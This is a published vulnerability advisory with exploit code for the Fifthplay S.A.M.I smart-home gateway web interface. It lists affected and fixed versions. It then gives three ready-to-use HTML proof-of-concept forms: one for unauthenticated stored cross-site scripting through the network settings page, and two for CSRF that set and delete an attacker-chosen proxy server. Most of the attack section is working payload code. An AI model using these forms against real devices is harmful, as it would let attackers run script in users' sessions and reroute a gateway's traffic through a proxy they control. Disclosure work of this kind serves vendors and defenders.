@@ -1,0 +1,120 @@
+# Exploit Title: Fifthplay S.A.M.I 2019.2_HP - Persistent Cross-Site Scripting
+# Date: 2020-01-29
+# Exploit Author: LiquidWorm
+# Vendor: Fifthplay NV
+# Vendor Homepage: https://www.fifthplay.com
+# Version: 2019.2_HP
+# Tested on: Linux
+# CVE : -
+
+Fifthplay S.A.M.I - Service And Management Interface Unauthenticated Stored XSS
+
+
+Vendor: Fifthplay NV
+Product web page: https://www.fifthplay.com
+Affected version: Platform: HAM V1.2
+                            HAM V1.1
+                            HAM V1.0
+                            DINHAM 10W
+                  Image Version: 2019.3-20190605144803
+                                 2019.2_HP-20190808154634
+                                 2018.4_HP-20181015152950
+                                 2018.2-20180516100815
+                                 2017.2_HP-20180213083050
+                                 2013.4_HP-201309301203
+                  AMP Version: 2019.2_HP
+                               2018.4_HP
+                               2017.2_HP
+                               2013.4_HP
+                               R20.19.03
+                               R20.18.02
+                  Fix: 2017.2-HP4
+                       2018.4_HP3
+                       2018.5_HP7
+                       2019.2_HP3
+                       2019.3_HP1
+
+Summary: Fifthplay is a Belgian high-tech player and a subsidiary of Niko Group. 
+We specialise in enriching smart homes and buildings for almost 10 years, and in
+services that provide comfort and energy. Our gateway provides a modular approach
+to integrating old and new technologies, such as smart meters, optical meters,
+sockets, switches. Fifthplay is a trendsetter with regards to smart homes and buildings
+and one of the sector's most innovative companies.
+
+Desc: The application suffers from an unauthenticated stored XSS through POST request.
+The issue is triggered when input passed via several parameters is not properly
+sanitized before being returned to the user. This can be exploited to execute arbitrary
+HTML and script code in a user's browser session in context of an affected site. The
+application interface also allows users to perform certain actions via HTTP requests
+without performing any validity checks to verify the requests. This can be exploited
+to perform certain actions if a user visits a malicious web site.
+
+Tested on: lighttpd/1.4.33
+           PHP/5.4.33
+           PHP/5.3.19
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2020-5561
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5561.php
+
+
+29.09.2019
+
+--
+
+
+Stored XSS:
+-----------
+
+<html>
+  <body>
+    <form action="http://192.168.11.1/?page=networksettings" method="POST">
+      <input type="hidden" name="server" value='"><script>prompt(251)</script>' />
+      <input type="hidden" name="port" value='"><script>prompt(252)</script>' />
+      <input type="hidden" name="auth" value="1" />
+      <input type="hidden" name="user" value='"><script>prompt(253)</script>' />
+      <input type="hidden" name="pass" value='"><script>prompt(254)</script>' />
+      <input type="hidden" name="submit" value="Change" />
+      <input type="submit" value="Write" />
+    </form>
+  </body>
+</html>
+
+
+Set proxy CSRF:
+---------------
+<html>
+  <body>
+    <form action="http://192.168.11.1/?page=networksettings" method="POST">
+      <input type="hidden" name="server" value="proxy.segfault.mk" />
+      <input type="hidden" name="port" value="8080" />
+      <input type="hidden" name="auth" value="1" />
+      <input type="hidden" name="user" value="testuser" />
+      <input type="hidden" name="pass" value="testpass" />
+      <input type="hidden" name="submit" value="Change" />
+      <input type="submit" value="Write" />
+    </form>
+  </body>
+</html>
+
+
+Delete proxy CSRF:
+------------------
+
+<html>
+  <body>
+    <form action="http://192.168.11.1/?page=networksettings" method="POST">
+      <input type="hidden" name="server" value="proxy.segfault.mk" />
+      <input type="hidden" name="port" value="8080" />
+      <input type="hidden" name="auth" value="1" />
+      <input type="hidden" name="user" value="testuser" />
+      <input type="hidden" name="pass" value="testpass" />
+      <input type="hidden" name="delete" value="Delete" />
+      <input type="submit" value="Clear" />
+    </form>
+  </body>
+</html>
